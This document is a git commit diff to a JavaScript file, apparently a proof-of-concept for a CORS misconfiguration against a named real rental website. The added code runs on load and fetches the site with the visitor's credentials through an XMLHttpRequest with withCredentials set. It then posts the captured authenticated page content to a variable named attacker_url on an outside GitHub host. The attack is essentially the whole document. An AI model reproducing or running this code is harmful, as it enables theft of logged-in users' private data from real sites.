80ac62a9d15500d2ce4a5d1c63ac9a34d1a40789
AssassinUKG <more4money@gmail.com>
2021-02-27 04:16:28 +0000

    Update file.js

--- file.js
+++ file.js
@@ -1,10 +1,18 @@
 function RegisterUser(){
+var cors = new XMLHttpRequest();
+			var Victim_url = 'https://www.irinarentals.com/';
+			cors.open('GET', Victim_url, true);
+			cors.withCredentials = true;
+			cors.onload = reqListener;
+			cors.send();
+			console.log(this.responseText)
 
-    var url = "https://www.irinarentals.com/wp-login.php";
-       
-    xhr = new XMLHttpRequest();
-    xhr.open("POST", url);
-    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    xhr.send(null);
+			function reqListener() {
+				var data = new XMLHttpRequest();
+				var attacker_url = 'https://raw.githubusercontent.com/AssassinUKG/testing/main/cookie.js';
+				data.open('POST', attacker_url);
+				data.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
+			};
 }
 RegisterUser();
